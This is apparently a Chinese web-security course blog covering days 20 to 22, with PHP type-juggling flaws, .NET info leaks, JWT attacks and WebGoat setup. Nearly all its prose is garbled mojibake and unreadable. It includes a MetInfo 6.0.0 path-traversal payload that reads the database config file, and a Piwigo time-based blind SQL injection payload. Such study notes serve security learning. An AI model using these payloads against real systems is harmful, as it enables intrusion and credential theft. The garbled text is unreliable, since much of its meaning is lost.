<p>#åˆ¤æ–­ç”¨æˆ·çš„èº«ä»½ï¼š<br>ç”±äºåå°æœ¬èº«æœ‰å¤šä¸ªåŠŸèƒ½æ–‡ä»¶é¡µé¢<br>1ã€åœ¨æ¯ä¸ªæ–‡ä»¶é‡Œé¢æ·»åŠ åˆ¤æ–­ä»£ç <br>2ã€åˆ›å»ºä¸€ä¸ªæ–‡ä»¶ä¸“é—¨ç”¨æ¥åˆ¤æ–­ï¼Œå…¶ä»–æ–‡ä»¶åŒ…å«è°ƒç”¨å®ƒ<br>#æ‰¾æœªæˆæƒè®¿é—®ï¼š<br>1ã€æ‰¾é‚£äº›æ–‡ä»¶æ²¡æœ‰åŒ…å«éªŒè¯ä»£ç æ–‡ä»¶<br>2ã€éªŒè¯ä»£ç æ–‡ä»¶æœ‰æ²¡æœ‰å¯ä»¥ç»•è¿‡</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-2"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-2" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h6 id="NETé¡¹ç›®-DLLæ–‡ä»¶åç¼–è¯‘æŒ‡å‘-ä»£ç ç‰¹æ€§"><a href="#NETé¡¹ç›®-DLLæ–‡ä»¶åç¼–è¯‘æŒ‡å‘-ä»£ç ç‰¹æ€§" class="headerlink" title=".NETé¡¹ç›®-DLLæ–‡ä»¶åç¼–è¯‘æŒ‡å‘-ä»£ç ç‰¹æ€§"></a>.NETé¡¹ç›®-DLLæ–‡ä»¶åç¼–è¯‘æŒ‡å‘-ä»£ç ç‰¹æ€§</h6><p>å·¥å…·ï¼šILSpy<br>å°†.netç›¸å…³æ–‡ä»¶åç¼€åä¸º.dllçš„ç³»åˆ—æ–‡ä»¶æ‹–å…¥è¯¥è½¯ä»¶å†…å³å¯å®ç°åç¼–è¯‘ï¼Œä»¥è¯»å–æºç ã€‚</p>
<h6 id="NETé¡¹ç›®-Web-configé”™è¯¯è°ƒè¯•-ä¿¡æ¯æ³„éœ²"><a href="#NETé¡¹ç›®-Web-configé”™è¯¯è°ƒè¯•-ä¿¡æ¯æ³„éœ²" class="headerlink" title=".NETé¡¹ç›®-Web.configé”™è¯¯è°ƒè¯•-ä¿¡æ¯æ³„éœ²"></a>.NETé¡¹ç›®-Web.configé”™è¯¯è°ƒè¯•-ä¿¡æ¯æ³„éœ²</h6><p>&#x2F;webconfigæ–‡ä»¶ä¸­å«æœ‰customError Mode å­—æ®µï¼Œè¯¥å­—æ®µæ˜¯ç”¨æ¥å¼€å‘è¿‡ç¨‹ä¸­æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ï¼Œä»¥ä¾¿äºæ’æŸ¥åŸå› <br>å½“customError mode &#x3D;â€œOffâ€ï¼Œåˆ™ä¼šå…ˆæ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼Œé€ æˆä¿¡æ¯æ³„éœ²ã€‚</p>
<blockquote>
<p>åœ¨æœåŠ¡å™¨ä¸Šè¿è¡Œç½‘ç«™ï¼Œè¿œç¨‹è®¿é—®è¯¥ç½‘ç«™æ—¶å€™ï¼Œæç¤ºwebconfigæ–‡ä»¶çš„é…ç½®æ— æ³•æ˜¾ç¤ºç¨‹åºä¸­å…·ä½“çš„é”™è¯¯ä¿¡æ¯ï¼ŒåŸå› æ˜¯æ²¡æœ‰å°†æ ‡è®°çš„â€œmodeâ€å±æ€§è®¾ç½®ä¸ºâ€œoffâ€ï¼Œç½‘ä¸ŠæŸ¥è¯¢æ ‡è®°çš„è¯¦ç»†ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<p>èŠ‚ç‚¹ç”¨äºå®šä¹‰ä¸€äº›è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯çš„ä¿¡æ¯ã€‚æ­¤èŠ‚ç‚¹æœ‰Modeå’ŒdefaultRedirectä¸¤ä¸ªå±æ€§ï¼Œå…¶ä¸­defaultRedirectå±æ€§æ˜¯ä¸€ä¸ªå¯é€‰å±æ€§ï¼Œè¡¨ç¤ºåº”ç”¨ç¨‹åºå‘ç”Ÿé”™è¯¯æ—¶é‡å®šå‘åˆ°çš„é»˜è®¤URLï¼Œå¦‚æœæ²¡æœ‰æŒ‡å®šè¯¥å±æ€§åˆ™æ˜¾ç¤ºä¸€èˆ¬æ€§é”™è¯¯ã€‚Modeå±æ€§æ˜¯ä¸€ä¸ªå¿…é€‰å±æ€§ï¼Œå®ƒæœ‰ä¸‰ä¸ªå¯èƒ½å€¼ï¼Œå®ƒä»¬æ‰€ä»£è¡¨çš„æ„ä¹‰åˆ†åˆ«å¦‚ä¸‹ï¼š<br>Mode è¯´æ˜ On è¡¨ç¤ºåœ¨æœ¬åœ°å’Œè¿œç¨‹ç”¨æˆ·éƒ½ä¼šçœ‹åˆ°è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯ã€‚ Off ç¦ç”¨è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯ï¼Œæœ¬åœ°å’Œè¿œç¨‹ç”¨æˆ·éƒ½ä¼šçœ‹åˆ°è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯ã€‚<br>RemoteOnly è¡¨ç¤ºæœ¬åœ°ç”¨æˆ·å°†çœ‹åˆ°è¯¦ç»†é”™è¯¯ä¿¡æ¯ï¼Œè€Œè¿œç¨‹ç”¨æˆ·å°†ä¼šçœ‹åˆ°è‡ªå®šä¹‰é”™è¯¯ä¿¡æ¯ã€‚<br>è¿™é‡Œæœ‰å¿…è¦è¯´æ˜ä¸€ä¸‹æœ¬åœ°ç”¨æˆ·å’Œè¿œç¨‹ç”¨æˆ·çš„æ¦‚å¿µã€‚å½“æˆ‘ä»¬è®¿é—®asp.netåº”ç”¨ç¨‹æ—¶æ‰€ä½¿ç”¨çš„æœºå™¨å’Œå‘å¸ƒasp.netåº”ç”¨ç¨‹åºæ‰€ä½¿ç”¨çš„æœºå™¨ä¸ºåŒä¸€å°æœºå™¨æ—¶æˆä¸ºæœ¬åœ°ç”¨æˆ·ï¼Œåä¹‹åˆ™ç§°ä¹‹ä¸ºè¿œç¨‹ç”¨æˆ·ã€‚åœ¨å¼€å‘è°ƒè¯•é˜¶æ®µä¸ºäº†ä¾¿äºæŸ¥æ‰¾é”™è¯¯Modeå±æ€§å»ºè®®è®¾ç½®ä¸ºOffï¼Œè€Œåœ¨éƒ¨ç½²é˜¶æ®µåº”å°†Modeå±æ€§è®¾ç½®ä¸ºOnæˆ–è€…RemoteOnlyï¼Œä»¥é¿å…è¿™äº›è¯¦ç»†çš„é”™è¯¯ä¿¡æ¯æš´éœ²äº†ç¨‹åºä»£ç ç»†èŠ‚ä»è€Œå¼•æ¥é»‘å®¢çš„å…¥ä¾µ</p>
</blockquote>
<h6 id="NETé¡¹ç›®-èº«ä»½éªŒè¯æœªæˆæƒè®¿é—®å®‰å…¨æ¼æ´"><a href="#NETé¡¹ç›®-èº«ä»½éªŒè¯æœªæˆæƒè®¿é—®å®‰å…¨æ¼æ´" class="headerlink" title=".NETé¡¹ç›®-èº«ä»½éªŒè¯æœªæˆæƒè®¿é—®å®‰å…¨æ¼æ´"></a>.NETé¡¹ç›®-èº«ä»½éªŒè¯æœªæˆæƒè®¿é—®å®‰å…¨æ¼æ´</h6><p>æµç¨‹ï¼šåœ¨æœªç™»å½•çŠ¶æ€é€šè¿‡ä¿®æ”¹URLè®¿é—®éœ€ç™»å½•çš„åœ°å€è·³è½¬åˆ°ç™»å½•ç•Œé¢â€“ç™½ç›’æµ‹è¯•æ‰¾åˆ°éªŒè¯ç™»å½•çš„ä»£ç ï¼ˆæ‰¾åˆ°æœªæˆæƒè®¿é—®æ–‡ä»¶ä»£ç â€“å¯»æ‰¾åŒ…å«ä»£ç â€“é€ä¸€å®¡æŸ¥â€“æ‰¾åˆ°ç™»å½•ä»£ç ï¼‰â€“å‘ç°ä»£ç å¯é€šè¿‡æŠ“åŒ…ä¿®æ”¹cookieä¿¡æ¯ç»•è¿‡â€“é€ æˆæœªæˆæƒè®¿é—®</p>
<h1 id="ç¬¬20å¤©-WEBæ”»é˜²-PHPç‰¹æ€§-ç¼ºé™·å¯¹æ¯”å‡½æ•°-CTFè€ƒç‚¹-CMSå®¡è®¡å®ä¾‹"><a href="#ç¬¬20å¤©-WEBæ”»é˜²-PHPç‰¹æ€§-ç¼ºé™·å¯¹æ¯”å‡½æ•°-CTFè€ƒç‚¹-CMSå®¡è®¡å®ä¾‹" class="headerlink" title="ç¬¬20å¤© WEBæ”»é˜²-PHPç‰¹æ€§&amp;ç¼ºé™·å¯¹æ¯”å‡½æ•°&amp;CTFè€ƒç‚¹&amp;CMSå®¡è®¡å®ä¾‹"></a>ç¬¬20å¤© WEBæ”»é˜²-PHPç‰¹æ€§&amp;ç¼ºé™·å¯¹æ¯”å‡½æ•°&amp;CTFè€ƒç‚¹&amp;CMSå®¡è®¡å®ä¾‹</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-5"><a href="#çŸ¥è¯†ç‚¹ï¼š-5" class="headerlink" title="#çŸ¥è¯†ç‚¹ï¼š"></a>#çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€è¿‡æ»¤å‡½è‡´ç¼ºé™·ç»•è¿‡<br>2ã€CTFè€ƒç‚¹ä¸ä»£ç å®¡è®¡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#è¯¦ç»†ç‚¹ï¼š</span><br><span class="line">= =ä¸=== ==å¼±ç±»å‹å¯¹æ¯” ===å¼ºç±»å‹å¯¹æ¯”</span><br><span class="line">md5 åœ¨PHPä¸­md5ä¸èƒ½ç”¨æ¥å¤„ç†æ•°ç»„ï¼Œå¤„ç†ç»“æœä¼šè¿”å›null æ‰€ä»¥å­˜åœ¨MD5ã€1ã€‘=null=null</span><br><span class="line">intval intval() å‡½æ•°ç”¨äºè·å–å˜é‡çš„æ•´æ•°å€¼ã€‚</span><br><span class="line">strpos strpos() få‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€å­—ç¬¦ä¸²ä¸­ç¬¬ä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ã€‚</span><br><span class="line">in_array in_array() å‡½æ•°æœç´¢æ•°ç»„ä¸­æ˜¯å¦å­˜åœ¨æŒ‡å®šçš„å€¼ã€‚å…¶ä¸­ç¬¬ä¸‰ä¸ªå‚æ•°è‹¥ä¸è®¾ç½®ä¸ºTUREåˆ™ç›¸å½“äºå¼±ç±»å‹åˆ¤æ–­</span><br><span class="line">preg_match preg_match å‡½æ•°ç”¨äºæ‰§è¡Œä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚å¯é€šè¿‡æ•°ç»„ç»•è¿‡</span><br><span class="line">str_replace str_replace() å‡½æ•°æ›¿æ¢å­—ç¬¦ä¸²ä¸­çš„ä¸€äº›å­—ç¬¦ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ï¼Œä¸å¯è¿­ä»£</span><br></pre></td></tr></table></figure>

<h4 id="æ¼”ç¤ºæ¡ˆä¾‹1ï¼š"><a href="#æ¼”ç¤ºæ¡ˆä¾‹1ï¼š" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹1ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹1ï¼š</h4><p>ctfshowçš„é¢˜ç›®ï¼ˆè¿™é‡Œå› ä¸ºå·²ç»åˆ·å®Œé¢˜å¹¶ä¸”å†™äº†wpäº†ï¼Œæ‰€ä»¥å°±ä¸è®°ä¸Šæ¥äº†ï¼‰</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹2ï¼š"><a href="#æ¼”ç¤ºæ¡ˆä¾‹2ï¼š" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹2ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹2ï¼š</h4><h6 id="å®è·µ-ä»£ç å®¡è®¡-è¿‡æ»¤ç¼ºé™·æ–‡ä»¶è¯»å–"><a href="#å®è·µ-ä»£ç å®¡è®¡-è¿‡æ»¤ç¼ºé™·æ–‡ä»¶è¯»å–" class="headerlink" title="å®è·µ-ä»£ç å®¡è®¡-è¿‡æ»¤ç¼ºé™·æ–‡ä»¶è¯»å–"></a>å®è·µ-ä»£ç å®¡è®¡-è¿‡æ»¤ç¼ºé™·æ–‡ä»¶è¯»å–</h6><p>æ¼æ´ç‚¹åœ¨ï¼šMetInfo6.0.0&#x2F;include&#x2F;thumb.php?dir&#x3D;<br>æ¼æ´ä»£ç æ–‡ä»¶ä½ç½®ï¼šMetInfo6.0.0\app\system\include\module\old_thumb.class.php<br>æœ‰ä¸¤æ¬¡è¿‡æ»¤ï¼Œç¬¬ä¸€æ¬¡æŠŠè·¯å¾„ä¸­â€¦&#x2F;ã€.&#x2F;è¿›è¡Œè¿‡æ»¤ï¼Œç¬¬äºŒæ¬¡è·¯å¾„ä¸­éœ€è¦æœ‰httpå’Œä¸èƒ½å­˜åœ¨.&#x2F;ï¼Œ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$dir</span> = <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;../&#x27;</span>,<span class="string">&#x27;./&#x27;</span>), <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;dir&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">str_replace</span>(<span class="variable">$_M</span>[<span class="string">&#x27;url&#x27;</span>][<span class="string">&#x27;site&#x27;</span>], <span class="string">&#x27;&#x27;</span>, <span class="variable">$dir</span>),<span class="number">0</span>,<span class="number">4</span>) == <span class="string">&#x27;http&#x27;</span> &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$dir</span>, <span class="string">&#x27;./&#x27;</span>) === <span class="literal">false</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: image/jpeg&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>();</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$dir</span>);</span><br><span class="line">    <span class="title function_ invoke__">ob_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">flush</span>();</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥ä½¿ç”¨åŒå†™è¿›è¡Œç»•è¿‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=â€¦///httpâ€¦///config\config_db.php</span><br><span class="line"></span><br><span class="line">/MetInfo/include/thumb.php?dir=.....///http\.....//\config\config_db.php</span><br></pre></td></tr></table></figure>

<p>ç»è¿‡è¿‡æ»¤åå˜æˆäº† <a href="http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=%E2%80%A6/http%E2%80%A6/config%5Cconfig_db.php">http://127.0.0.1/MetInfo6.0.0/include/thumb.php?dir=â€¦/httpâ€¦/config\config_db.php</a></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-04/5f41dabeda66c8cc8e5875e43621f7e5--1cc9--image-20240404193535385.png" alt="image-20240404193535385">æ‹“å±•é“¾æ¥ï¼š<a href="https://blog.csdn.net/m0_63241485/article/details/126580849">https://blog.csdn.net/m0_63241485/article/details/126580849</a></p>
<h6 id="å¼€æºç›¸å†Œpiwigo-sqlæ³¨å…¥æ¼æ´"><a href="#å¼€æºç›¸å†Œpiwigo-sqlæ³¨å…¥æ¼æ´" class="headerlink" title="å¼€æºç›¸å†Œpiwigo sqlæ³¨å…¥æ¼æ´"></a>å¼€æºç›¸å†Œpiwigo sqlæ³¨å…¥æ¼æ´</h6><p>åŸç†ï¼šæ¼æ´çš„åˆ†æçœ‹èµ·æ¥æ¯”è¾ƒç®€å•ï¼Œæ˜¯ç”±äºfunctions_rate.inc.phpæ–‡ä»¶ä¸­çš„rate_pictureå‡½æ•°æ²¡æœ‰å¯¹ä¼ å…¥çš„$rateå˜é‡è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥æ‹¼æ¥åˆ°SQLä¸­æ‰§è¡Œï¼šä»£ç å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$query</span> = <span class="string">&#x27;</span></span><br><span class="line"><span class="string">INSERT</span></span><br><span class="line"><span class="string">  INTO &#x27;</span>.RATE_TABLE.<span class="string">&#x27;</span></span><br><span class="line"><span class="string">  (user_id,anonymous_id,element_id,rate,date)</span></span><br><span class="line"><span class="string">  VALUES</span></span><br><span class="line"><span class="string">  (&#x27;</span></span><br><span class="line">    .<span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>].<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$anonymous_id</span>.<span class="string">&#x27;\&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$image_id</span>.<span class="string">&#x27;,&#x27;</span></span><br><span class="line">    .<span class="variable">$rate</span></span><br><span class="line">    .<span class="string">&#x27;,NOW())</span></span><br><span class="line"><span class="string">;&#x27;</span>;</span><br><span class="line">  <span class="title function_ invoke__">pwg_query</span>(<span class="variable">$query</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">update_rating_score</span>(<span class="variable">$image_id</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ¤æ–­r a t e æ˜¯å¦æ˜¯ rateæ˜¯å¦æ˜¯rateæ˜¯å¦æ˜¯conf[â€˜rate_itemsâ€™]çš„é¡¹ã€‚è€Œåé¢è¿™ä¸ªæ•°ç»„çš„å€¼æ˜¯é…ç½®æ–‡ä»¶é‡Œå†™æ­»çš„ã€‚</p>
<p>çœ‹èµ·æ¥è¿™å¥çš„åŠŸèƒ½æ˜¯è®¾ç½®äº†ä¸€ä¸ªrateå˜é‡çš„ç™½åå•ã€‚åªèƒ½æ˜¯0,1,2,3,4,5å…¶ä¸­ä¹‹ä¸€ã€‚è¿™æ ·å­åº”è¯¥å¾ˆå®‰å…¨æ‰å¯¹ã€‚å½“ç„¶äº‹å®è¯æ˜è¿™æ ·å­å†™æ˜¯ä¸å®‰å…¨çš„ã€‚rate&#x3D;â€ 5â€²aaaaaaaaaaaaaaaaaâ€ æ—¶ï¼Œ inarray( rate &#x3D; â€œ5â€™aaaaaaaaaaaaaaaaa â€œæ—¶ï¼Œin_array(rate&#x3D;â€5 â€²aaaaaaaaaaaaaaaaaâ€æ—¶ï¼Œinarray(rate, $conf[â€˜rate_itemsâ€™]) è¿™ä¸ªåˆ¤æ–­æ˜¯è¿”å›Trueçš„ã€‚è¿™æ˜¯phpé‡Œä¸åŒç±»å‹å˜é‡æ¯”è¾ƒæ—¶å€™çš„ä¸€ä¸ªç‰¹æ€§ã€‚åªè¦rateä¸ºarray(0,1,2,3,4,5)ä¾¿å¯ä»¥è¿›è¡Œç»•è¿‡ï¼Œè€Œin_arrayç¬¬ä¸‰ä½æœªè®¾ç½®ä¸ºtrue<br>1,1 and if(ascii(substr((select database()),1,1))&#x3D;112,1,sleep(3)));#<br>ç®€è¨€ä¹‹ï¼šå½“å­—ç¬¦ä¸²è·Ÿæ•´å‹å˜é‡ä½¿ç”¨â€&#x3D;&#x3D;â€æ¯”è¾ƒçš„æ—¶å€™ï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´å‹ï¼Œå†è¿›è¡Œæ¯”è¾ƒã€‚</p>
<h1 id="ç¬¬21å¤©-WEBæ”»é˜²-JavaWebé¡¹ç›®-JWTèº«ä»½æ”»å‡»-ç»„ä»¶å®‰å…¨-è®¿é—®æ§åˆ¶"><a href="#ç¬¬21å¤©-WEBæ”»é˜²-JavaWebé¡¹ç›®-JWTèº«ä»½æ”»å‡»-ç»„ä»¶å®‰å…¨-è®¿é—®æ§åˆ¶" class="headerlink" title="ç¬¬21å¤© WEBæ”»é˜²-JavaWebé¡¹ç›®&amp;JWTèº«ä»½æ”»å‡»&amp;ç»„ä»¶å®‰å…¨&amp;è®¿é—®æ§åˆ¶"></a>ç¬¬21å¤© WEBæ”»é˜²-JavaWebé¡¹ç›®&amp;JWTèº«ä»½æ”»å‡»&amp;ç»„ä»¶å®‰å…¨&amp;è®¿é—®æ§åˆ¶</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-6"><a href="#çŸ¥è¯†ç‚¹ï¼š-6" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€JavaWebå¸¸è§å®‰å…¨åŠä»£ç é€»è¾‘(é€šè¿‡æŠ“åŒ…æ‰¾åˆ°ç½‘ç«™é¡µé¢å¯¹åº”çš„æ–‡ä»¶åœ°å€ä»¥åŠåŠŸèƒ½ä»£ç )<br>2ã€ç›®å½•éå†&amp;èº«ä»½éªŒè¯&amp;é€»è¾‘&amp;JWT<br>3ã€è®¿é—®æ§åˆ¶&amp;å®‰å…¨ç»„ä»¶&amp;è¶Šæƒ&amp;ä¸‰æ–¹ç»„ä»¶</p>
<h4 id="æ¼”ç¤ºæ¡ˆä¾‹ï¼š-3"><a href="#æ¼”ç¤ºæ¡ˆä¾‹ï¼š-3" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹ï¼š"></a>æ¼”ç¤ºæ¡ˆä¾‹ï¼š</h4><h6 id="JavaWeb-WebGoat8é¶åœºæ­å»ºä½¿ç”¨"><a href="#JavaWeb-WebGoat8é¶åœºæ­å»ºä½¿ç”¨" class="headerlink" title="JavaWeb-WebGoat8é¶åœºæ­å»ºä½¿ç”¨"></a>JavaWeb-WebGoat8é¶åœºæ­å»ºä½¿ç”¨</h6><p>æ­å»ºï¼šä¸‹è½½jaråŒ…â€“ä½¿ç”¨java -jar webgoat-server-8.0.0.M26.jar â€“server.port&#x3D;9091 å¼€å¯â€“æµè§ˆå™¨è®¿é—®127.0.0.1:9091&#x2F;WebGoat&#x2F;login.html å³å¯<br>è¯¦ç»†æ­å»ºæ­¥éª¤è§ï¼š<a href="https://blog.csdn.net/weixin_50012220/article/details/119209336">https://blog.csdn.net/weixin_50012220/article/details/119209336</a>          â€“å¥½åƒæ­å»ºè¿˜å¾—éœ€è¦é«˜ç‚¹ç‰ˆæœ¬çš„javaç¯å¢ƒï¼Œjava8å’Œjava11éƒ½ä¸å¤ªè¡Œï¼Œè€Œä¸”æ­å»ºåœ¨è™šæ‹Ÿæœºä¸Šå¥½åƒæ˜¯ä¸èƒ½ä»æœ¬åœ°ä¸Šå»è®¿é—®åˆ°çš„ã€‚</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-04-05/091f0354f3dfee15ffed99be242aef22--27f7--image-20240405104254959.png" alt="image-20240405104254959"></p>
<h6 id="å®‰å…¨é—®é¢˜-ç›®å½•éå†-èº«ä»½è®¤è¯-JWTæ”»å‡»"><a href="#å®‰å…¨é—®é¢˜-ç›®å½•éå†-èº«ä»½è®¤è¯-JWTæ”»å‡»" class="headerlink" title="å®‰å…¨é—®é¢˜-ç›®å½•éå†&amp;èº«ä»½è®¤è¯-JWTæ”»å‡»"></a>å®‰å…¨é—®é¢˜-ç›®å½•éå†&amp;èº«ä»½è®¤è¯-JWTæ”»å‡»</h6><p>1ã€ä¸Šä¼ æ–‡ä»¶æ—¶çš„ç›®å½•éå†<br>é€šè¿‡ä¸Šä¼ å›æ˜¾å’Œç›®æ ‡è·¯å¾„æ¯”è¾ƒå‘ç°éœ€è¦å°†æ–‡ä»¶ä¸Šä¼ åˆ°ä¸Šä¸€çº§ç›®å½•â€“ä½¿ç”¨burpæ”¹åŒ…â€“â€¦&#x2F;text<br>åŒå†™ç»•è¿‡</p>
<p>#èº«ä»½è®¤è¯<br>é”®å€¼é€»è¾‘ï¼šä½¿ç”¨é”®åé”®å€¼è¿›è¡Œå¯¹æ¯”éªŒè¯é”™è¯¯<br>-JWTæ”»å‡»ï¼š</p>
<p>1ã€ç­¾åæ²¡éªŒè¯ç©ºåŠ å¯†</p>
<p>2ã€çˆ†ç ´å¯†åŒ™</p>
<p>3ã€KIDåˆ©ç”¨<br><a href="https://www.cnblogs.com/vege/p/14468030.html">https://www.cnblogs.com/vege/p/14468030.html</a><br>æ­¤å¤„å› ä¸ºèµ‹å€¼æ˜¯å†™æ­»çš„ï¼Œè€Œä¸æ˜¯å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ï¼Œæ‰€ä»¥å¯ä»¥é€šè¿‡ä¿®æ”¹é”®åç§°ç»•è¿‡ï¼ˆs2&#x3D;null and s3&#x3D;null ä¸ºçœŸï¼‰</p>
<p>#è®¿é—®æ§åˆ¶<br>éšè—å±æ€§ï¼šå‰ç«¯é¡µé¢çš„è‡ªæ…°é™åˆ¶æ˜¾ç¤º<br>æ°´å¹³è¶Šæƒï¼šåŒä¸€çº§åˆ«ç”¨æˆ·æƒé™çš„æŸ¥çœ‹</p>
<h6 id="å®‰å…¨é—®é¢˜-è®¿é—®æ§åˆ¶-å®‰å…¨ç»„ä»¶ç¬¬ä¸‰æ–¹ç»„ä»¶"><a href="#å®‰å…¨é—®é¢˜-è®¿é—®æ§åˆ¶-å®‰å…¨ç»„ä»¶ç¬¬ä¸‰æ–¹ç»„ä»¶" class="headerlink" title="å®‰å…¨é—®é¢˜-è®¿é—®æ§åˆ¶&amp;å®‰å…¨ç»„ä»¶ç¬¬ä¸‰æ–¹ç»„ä»¶"></a><strong>å®‰å…¨é—®é¢˜-è®¿é—®æ§åˆ¶&amp;å®‰å…¨ç»„ä»¶ç¬¬ä¸‰æ–¹ç»„ä»¶</strong></h6><p>#å®‰å…¨ç»„ä»¶<br>è”æƒ³åˆ°å‰å‡ å¹´çš„Log4j2<br>#ç¯å¢ƒä¸‹è½½ï¼š<br><a href="https://github.com/WebGoat/WebGoat">https://github.com/WebGoat/WebGoat</a></p>
<h1 id="ç¬¬22å¤©-WEBæ”»é˜²-JSé¡¹ç›®-Node-JSiæ¡†æ¶å®‰å…¨8è¯†åˆ«å®¡è®¡-éªŒè¯ç»•è¿‡"><a href="#ç¬¬22å¤©-WEBæ”»é˜²-JSé¡¹ç›®-Node-JSiæ¡†æ¶å®‰å…¨8è¯†åˆ«å®¡è®¡-éªŒè¯ç»•è¿‡" class="headerlink" title="ç¬¬22å¤© WEBæ”»é˜²-JSé¡¹ç›®&amp;Node.JSiæ¡†æ¶å®‰å…¨8è¯†åˆ«å®¡è®¡&amp;éªŒè¯ç»•è¿‡"></a>ç¬¬22å¤© WEBæ”»é˜²-JSé¡¹ç›®&amp;Node.JSiæ¡†æ¶å®‰å…¨8è¯†åˆ«å®¡è®¡&amp;éªŒè¯ç»•è¿‡</h1><h4 id="çŸ¥è¯†ç‚¹ï¼š-7"><a href="#çŸ¥è¯†ç‚¹ï¼š-7" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h4><p>1ã€åŸç”ŸJSå¼€å‘æ¡†æ¶-å®‰å…¨æ¡ä»¶<br>2ã€å¸¸è§å®‰å…¨é—®é¢˜-å‰ç«¯éªŒè¯ï¼šæœªæˆæƒ</p>
